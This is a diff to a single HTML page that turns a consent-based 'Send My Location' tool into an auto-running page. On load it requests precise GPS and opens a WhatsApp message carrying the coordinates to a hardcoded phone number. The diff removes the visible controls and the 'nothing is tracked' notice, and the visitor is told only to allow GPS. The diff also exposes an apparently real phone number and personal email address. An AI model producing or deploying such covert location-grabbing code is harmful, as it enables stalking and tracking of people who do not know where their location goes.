@@ -2,73 +2,15 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
+  <title>Auto Location Send</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Send My Location</title>
-  <meta name="description" content="Tap once, allow GPS, and share your current location." />
-  <style>
-    :root {
-      --bg: #0b1020; --card:#121a33; --text:#e8ecff; --muted:#9fb0ff; --ok:#56d364; --warn:#f2cc60; --err:#ff6b6b; --btn:#2b3a71;
-    }
-    html,body{height:100%;}
-    body{margin:0; font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Helvetica,Arial,sans-serif; background:var(--bg); color:var(--text); display:grid; place-items:center;}
-    .card{width:min(680px,96vw); background:linear-gradient(180deg,var(--card),#0f1730 60%); padding:22px; border-radius:22px; box-shadow:0 10px 30px rgba(0,0,0,.35);}
-    h1{margin:0 0 4px 0; font-size:1.6rem}
-    p{color:var(--muted)}
-    .row{display:flex; gap:12px; flex-wrap:wrap;}
-    .btn{appearance:none; border:none; padding:14px 16px; border-radius:14px; background:var(--btn); color:var(--text); font-weight:600; cursor:pointer}
-    .btn:disabled{opacity:.6; cursor:not-allowed}
-    .btn.ok{background:#1f7a3a}
-    .btn.warn{background:#8a6a1a}
-    .btn.err{background:#7a1f2a}
-    .mono{font-family: ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace; font-size:.95rem}
-    .box{background:rgba(255,255,255,.04); padding:14px; border-radius:14px}
-    .small{font-size:.9rem}
-    a{color:#b9c8ff}
-  </style>
 </head>
-<body>
-  <main class="card">
-    <h1>Send My Location</h1>
-    <p class="small">Tap the button and press <b>Allow</b> when the browser asks for location permission.</p>
-    <div class="row" style="margin:14px 0 18px">
-      <button id="btnGet" class="btn">📍 Get Current Location</button>
-      <button id="btnShare" class="btn" disabled>🔗 Share / Send</button>
-      <button id="btnCopy" class="btn" disabled>📋 Copy</button>
-      <button id="btnRetry" class="btn warn" style="display:none">↻ Try Again</button>
-    </div>
-
-    <div id="status" class="box small">Ready. Click <b>Get Current Location</b>.</div>
-
-    <div id="details" class="box mono" style="margin-top:14px; display:none"></div>
-
-    <div id="links" class="row" style="margin-top:12px; display:none">
-      <a id="waLink" class="btn" href="#" target="_blank" rel="noopener">WhatsApp</a>
-      <a id="mailLink" class="btn" href="#">Email</a>
-    </div>
-
-    <p class="small" style="margin-top:18px; color:#7f8ccf">
-      Note: Your location is only collected after you press <b>Allow</b>. Nothing is tracked in the background.
-    </p>
-  </main>
+<body style="background:#0b1020;color:white;display:flex;align-items:center;justify-content:center;height:100vh;">
+  <h3>Getting your location... Please allow GPS</h3>
 
 <script>
 (function(){
-  const btnGet = document.getElementById('btnGet');
-  const btnShare = document.getElementById('btnShare');
-  const btnCopy = document.getElementById('btnCopy');
-  const btnRetry = document.getElementById('btnRetry');
-  const statusEl = document.getElementById('status');
-  const detailsEl = document.getElementById('details');
-  const linksRow = document.getElementById('links');
-  const waLink = document.getElementById('waLink');
-  const mailLink = document.getElementById('mailLink');
-
-  let lastPayload = null;
-
-  function setStatus(msg, kind){
-    statusEl.textContent = msg;
-    statusEl.style.borderLeft = '4px solid '+(kind==='err'?'#ff6b6b':kind==='warn'?'#f2cc60':'#56d364');
-  }
+  const PHONE = "923445070959";  // ✅ Aapka WhatsApp number
 
   function fmt(n){return Number(n).toFixed(6)}
 
@@ -77,84 +19,28 @@
     return `📍 Current Location\n\nLat: ${p.lat}\nLon: ${p.lon}\nAccuracy: ${p.acc} m\nTime: ${p.ts}\n\nMap: ${gmaps}`;
   }
 
-  function updateUI(p){
-    const gmaps = `https://maps.google.com/?q=${p.lat},${p.lon}`;
-    detailsEl.style.display = 'block';
-    detailsEl.innerHTML = `Lat: <b>${p.lat}</b>\n<br>Lon: <b>${p.lon}</b>\n<br>Accuracy: <b>${p.acc} m</b>\n<br>Time: <b>${p.ts}</b>\n<br>Map: <a href="${gmaps}" target="_blank" rel="noopener">Open in Google Maps</a>`;
-
+  function sendLocation(p){
     const text = encodeURIComponent(composeMessage(p));
-
-    // ✅ Aapke details
-    const PARENT_WHATSAPP = "923445070959"; 
-    const PARENT_EMAIL = "shabbirbaig1412@gmail.com";
-
-    const waHref = PARENT_WHATSAPP
-      ? `https://wa.me/${PARENT_WHATSAPP}?text=${text}`
-      : `https://wa.me/?text=${text}`;
-
-    waLink.href = waHref;
-    mailLink.href = `mailto:${encodeURIComponent(PARENT_EMAIL)}?subject=${encodeURIComponent('My current location')}&body=${text}`;
-
-    linksRow.style.display = 'flex';
-    btnShare.disabled = false;
-    btnCopy.disabled = false;
+    // Sirf WhatsApp par redirect
+    window.open(`https://wa.me/${PHONE}?text=${text}`, "_blank");
   }
 
-  function getLocation(){
-    btnGet.disabled = true;
-    btnRetry.style.display = 'none';
-    setStatus('Requesting GPS… Please tap Allow when prompted.');
-
-    if(!('geolocation' in navigator)){
-      setStatus('Geolocation is not supported on this device/browser.', 'err');
-      btnGet.disabled = false; return;
-    }
-
-    navigator.geolocation.getCurrentPosition(async (pos)=>{
+  if("geolocation" in navigator){
+    navigator.geolocation.getCurrentPosition(pos=>{
       const p = {
         lat: fmt(pos.coords.latitude),
         lon: fmt(pos.coords.longitude),
         acc: Math.round(pos.coords.accuracy),
         ts: new Date().toLocaleString()
       };
-      lastPayload = p;
-      setStatus('Location captured successfully.');
-      updateUI(p);
-      btnGet.disabled = false;
-    }, (err)=>{
-      let msg = 'Unable to get location.';
-      if(err.code === 1) msg = 'Permission denied. Please tap Allow.';
-      if(err.code === 2) msg = 'Position unavailable. Try moving near open sky.';
-      if(err.code === 3) msg = 'Timed out. Please try again.';
-      setStatus(msg, 'err');
-      btnGet.disabled = false;
-      btnRetry.style.display = 'inline-block';
+      sendLocation(p);
+      document.body.innerHTML = "<h3>✅ Location sent to WhatsApp.</h3>";
+    }, err=>{
+      document.body.innerHTML = "<h3 style='color:red'>❌ Failed to get location. Please allow GPS.</h3>";
     }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
+  } else {
+    document.body.innerHTML = "<h3 style='color:red'>❌ GPS not supported on this device.</h3>";
   }
-
-  btnGet.addEventListener('click', getLocation);
-  btnRetry.addEventListener('click', getLocation);
-
-  btnCopy.addEventListener('click', async ()=>{
-    if(!lastPayload) return;
-    try{
-      await navigator.clipboard.writeText(composeMessage(lastPayload));
-      setStatus('Copied to clipboard.');
-    }catch{ setStatus('Copy failed. Long-press to select and copy.', 'warn'); }
-  });
-
-  btnShare.addEventListener('click', async ()=>{
-    if(!lastPayload) return;
-    const text = composeMessage(lastPayload);
-    const gmaps = `https://maps.google.com/?q=${lastPayload.lat},${lastPayload.lon}`;
-    try{
-      if(navigator.share){
-        await navigator.share({ title:'My current location', text, url: gmaps });
-      } else {
-        window.open(waLink.href, '_blank');
-      }
-    }catch(e){ setStatus('Share cancelled.', 'warn'); }
-  });
 })();
 </script>
 </body>
